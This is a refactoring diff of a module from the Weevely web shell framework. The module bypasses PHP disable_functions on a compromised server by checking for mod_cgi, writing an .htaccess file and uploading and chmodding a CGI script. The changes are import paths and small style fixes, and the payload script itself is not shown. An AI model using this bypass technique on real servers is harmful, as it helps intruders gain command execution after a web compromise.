@@ -1,12 +1,14 @@
-from core.vectors import PhpCode, ShellCmd, ModuleExec, Os
-from core.module import Module, Status
-from core.loggers import log
-from core import modules
-from core import messages
-from utils import strings
-from utils import http
-import string
 import os
+import string
+
+from weevely.core import messages
+from weevely.core.loggers import log
+from weevely.core.module import Module
+from weevely.core.module import Status
+from weevely.core.vectors import ModuleExec
+from weevely.core.vectors import PhpCode
+from weevely.utils import http
+from weevely.utils import strings
 
 
 class Disablefunctionbypass(Module):
@@ -42,7 +44,7 @@ class Disablefunctionbypass(Module):
             [
                 PhpCode(
                     """(is_callable('apache_get_modules')&&in_array('mod_cgi', apache_get_modules())&&print(1))||print(0);""",
-                    postprocess=lambda x: True if x == "1" else False,
+                    postprocess=lambda x: x == "1",
                     name="mod_cgi",
                 ),
                 ModuleExec(
@@ -68,7 +70,7 @@ class Disablefunctionbypass(Module):
     def _install(self):
         if not self.vectors.get_result("mod_cgi"):
             log.warning(messages.module_audit_disablefunctionbypass.error_mod_cgi_disabled)
-            return
+            return None
 
         filename = strings.randstr(5, charset=string.ascii_lowercase).decode("utf-8")
         ext = strings.randstr(3, charset=string.ascii_lowercase).decode("utf-8")
@@ -76,7 +78,7 @@ class Disablefunctionbypass(Module):
         result_install_htaccess = self.vectors.get_result("install_htaccess", format_args={"extension": ext})
         if not result_install_htaccess or not result_install_htaccess[0][0] or not result_install_htaccess[0][1]:
             log.warning(messages.module_audit_disablefunctionbypass.error_installing_htaccess)
-            return
+            return None
 
         htaccess_absolute_path = result_install_htaccess[0][0]
         script_absolute_path = "%s.%s" % (htaccess_absolute_path.replace(".htaccess", filename), ext)
@@ -88,18 +90,18 @@ class Disablefunctionbypass(Module):
         if not result_install_script:
             log.warning(messages.module_audit_disablefunctionbypass.error_uploading_script_to_s % script_absolute_path)
             self._clean(htaccess_absolute_path, script_absolute_path)
-            return
+            return None
 
         result_chmod = self.vectors.get_result("chmod", format_args={"rpath": script_absolute_path})
         if not result_chmod:
             log.warning(messages.module_audit_disablefunctionbypass.error_changing_s_mode % script_absolute_path)
             self._clean(htaccess_absolute_path, script_absolute_path)
-            return
+            return None
 
         if not self._check_response(script_url):
             log.warning(messages.module_audit_disablefunctionbypass.error_s_unexpected_output % (script_url))
             self._clean(htaccess_absolute_path, script_absolute_path)
-            return
+            return None
 
         log.warning(
             messages.module_audit_disablefunctionbypass.cgi_installed_remove_s_s
